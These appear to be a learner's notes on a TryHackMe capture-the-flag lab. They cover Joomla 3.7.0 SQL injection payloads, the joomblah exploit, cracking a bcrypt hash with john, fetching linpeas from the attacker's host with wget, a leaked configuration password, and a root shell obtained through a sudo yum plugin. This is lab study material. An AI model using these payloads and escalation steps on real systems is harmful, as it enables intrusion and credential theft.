thm - 2021_05_19 dailybugle

### Enumeration

did the standard nmap, gobuster, nikto
quite impress with this scan
sudo nmap -sV --script vuln 10.10.96.81  

|     Source: window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no')
|_    Pages: http://10.10.96.81:80/, http://10.10.96.81:80/index.php/2-uncategorised/1-spider-man-robs-bank, http://10.10.96.81:80/index.php/2-uncategorised
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /robots.txt: Robots file
|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
|   /language/en-GB/en-GB.xml: Joomla version 3.7.0
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
| http-vuln-cve2017-8917: 
|   VULNERABLE:
|   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-8917
|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
|       to execute aribitrary SQL commands via unspecified vectors.
|       
|     Disclosure date: 2017-05-17


### Looking at Joomla SQLi 

```
Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)

```
how do i use it?? 

pretty sure this is illegal, gonna return to learn how to exploit manually
┌──(kali㉿kali)-[~/tryhackme/dailybugle/joomblah-3]
└─$ python joomblah.py http://10.10.96.81:80    


└─$ john --format=bcrypt hash.txt --wordlist=/home/kali/Downloads/rockyou.txt                         1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:55 0.03% (ETA: 2021-05-21 10:31) 0g/s 105.0p/s 105.0c/s 105.0C/s friend1..wildchild
0g 0:00:01:21 0.05% (ETA: 2021-05-21 10:15) 0g/s 105.0p/s 105.0c/s 105.0C/s classof2010..nenas
0g 0:00:01:23 0.05% (ETA: 2021-05-21 10:13) 0g/s 105.2p/s 105.2c/s 105.2C/s alphabet..jigsaw
0g 0:00:02:49 0.10% (ETA: 2021-05-21 13:06) 0g/s 98.58p/s 98.58c/s 98.58C/s mike16..ice-cream
0g 0:00:09:22 0.25% (ETA: 2021-05-22 03:40) 0g/s 76.12p/s 76.12c/s 76.12C/s naranjo..mhines
spiderman123     (?)
1g 0:00:10:17 DONE (2021-05-19 12:39) 0.001619g/s 75.87p/s 75.87c/s 75.87C/s thebadboy..spaceship
Use the "--show" option to display all of the cracked passwords reliably
Session completed


### secure your tmp directory people 

download linpeas in tmp as it's like the only place where i got write access
sh-4.2$ cd tmp
cd tmp
sh-4.2$ wget 10.4.24.92:8000/linpeas.sh
wget 10.4.24.92:8000/linpeas.sh
--2021-05-19 13:31:08--  http://10.4.24.92:8000/linpeas.sh
Connecting to 10.4.24.92:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 341117 (333K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... .......... 15% 70.2K 4s
    50K .......... .......... .......... .......... .......... 30%  139K 2s
   100K .......... .......... .......... .......... .......... 45% 6.13M 1s
   150K .......... .......... .......... .......... .......... 60%  144K 1s
   200K .......... .......... .......... .......... .......... 75% 10.7M 0s
   250K .......... .......... .......... .......... .......... 90% 8.31M 0s
   300K .......... .......... .......... ...                  100% 9.69M=1.4s

2021-05-19 13:31:10 (231 KB/s) - 'linpeas.sh' saved [341117/341117]


sh-4.2$ ./linpeas.sh
./linpeas.sh
sh: ./linpeas.sh: Permission denied
sh-4.2$ ls -l linpeas.sh
ls -l linpeas.sh
-rw-rw-rw- 1 apache apache 341117 May 19 13:13 linpeas.sh
sh-4.2$ chmod 777 linpeas.sh
chmod 777 linpeas.sh

/var/www/html/configuration.php:        public $password = 'nv5uz9r3ZEDzVjNu';


[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
27a260fe3cba712cfdedb1c86d80442e
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
[jjameson@dailybugle ~]$ 

[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# 

sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79


completed 20may 2021
